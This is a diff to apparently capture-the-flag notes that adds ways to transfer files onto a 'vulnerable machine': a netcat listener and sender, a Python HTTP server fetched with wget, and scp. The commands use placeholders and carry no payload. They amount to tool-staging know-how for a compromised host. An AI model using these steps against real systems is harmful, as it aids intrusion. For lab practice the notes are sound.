@@ -16,6 +16,14 @@ Generally, the user and root flags will be found on this paths:
 * Netcat (nc) or Ncat
   - Using the `nc` or `ncat` tool to transfer files over a network connection.
   - On the receiving (vulnerable) machine, start a listener: ``` nc -nlvp <port> > received_file ```
-  - - On the local machine, send the file: ``` nc <target IP> <port> <file_to_send> ```
+  - On the local machine, send the file: ``` nc <target IP> <port> <file_to_send> ```
 
-* Another example  
+* Python HTTP Server
+  - Using Python's built-in HTTP server module to host the file.
+  - On the local machine, navigate to the directory containing the file: ``` cd /path/to/file/ ```
+  - Start the HTTP server: ``` python -m http.server <port> ```
+  - On the vulnerable machine, use `wget` or `curl` to download the file: ``` wget <your_local_ip>:<port>/file_to_download ```
+
+* SCP (Secure Copy)
+  - Using the `scp` command to securely transfer files over SSH.
+  - On the local machine, use `scp` to copy the file to the vulnerable machine: ``` scp /path/to/file user@<target IP>:/path/on/vulnerable/machine ```
